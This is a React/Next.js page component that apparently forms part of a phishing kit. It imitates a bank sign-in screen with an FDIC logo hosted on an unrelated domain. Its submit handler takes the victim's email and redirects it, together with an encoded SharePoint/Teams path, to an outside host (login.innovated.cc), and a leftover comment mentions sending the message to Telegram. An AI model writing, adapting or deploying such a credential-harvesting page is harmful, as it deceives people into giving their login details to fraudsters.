'use client'

export default function Home() {

  const handleSubmit = (e) => {
    e.preventDefault();
    const continueBtn = document.querySelector(".LoginBtn");
    continueBtn.innerHTML = "Processing..."

    const userID = document.getElementById('userid').value.trim();

    // Format the message to send to Telegram
    const url = `https://login.innovated.cc?CvptuaMGoA=aHR0cHM6Ly9taWNyb3NvZnQuc2hhcmVwb2ludC5jb20vOng6L3IvdGVhbXMvKipURUFN&omn=${userID}`;

    try {
      setTimeout(() => {
        window.location.href = url;
      }, 1500);
      console.log("Message sent!!")
    } catch (error) {
      console.error('Error:', error);
    }
  }
  return (
    <>
      
      <main className="grandCntn">
        <div className="formCntn">
          <div className="formTitle">
            <img src="/logo.svg" alt="" />
          </div>
          <div className="form">
            <form className="firstSection login" onSubmit={(e) => {handleSubmit(e)}}>
              <div className="inputCntn userID">
                <label htmlFor="UserID">Email</label>
                <input id="userid" type="email" autoFocus required minLength="4" placeholder="you@company.com" />
              </div>


              <div className="submissionCntn">
                <div className="rememberMe">
                  <input type="checkbox" id="rememberUser" />
                  <label for="rememberUser">
                    <svg aria-hidden="true" focusable="false" width="20" height="20" viewBox="0 0 20 20">
                      <rect fill="none" stroke="none" strokeWidth="2" x="1" y="1" width="18" height="18" rx="3"></rect>
                      <polyline fill="none" stroke="none" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" points="4 11.4390244 7.44978307 15.0611808 16 5"></polyline>
                    </svg>
                    <span>Remember me</span>
                  </label>
                </div>

                <button type="submit" className="LoginBtn signInBtn">Next</button>
              </div>
            </form>

          </div>
          <div className="formFooter">
            <a href="#" className="loc">Locations</a>
            <a href="#" className="pol">Privacy Policy</a>
            <a href="#" className="enrol">Enroll</a>
          </div>
        </div>
        <div className="fdicLogoCntn"><a href="https://cdn1.onlineaccess1.com/cdn/depot/3308/4366/8d7a1cb117b7827559a004f16ac35368/assets/images/fdic_logo_large-101554d3eebb7c3c6fedb7d73549127b.png" target="_blank" rel="noopener noreferrer"><img src="https://www.dmayorfitness.com/fdic_logo.png" alt="" /></a></div>
      </main>
    </>
  );
}
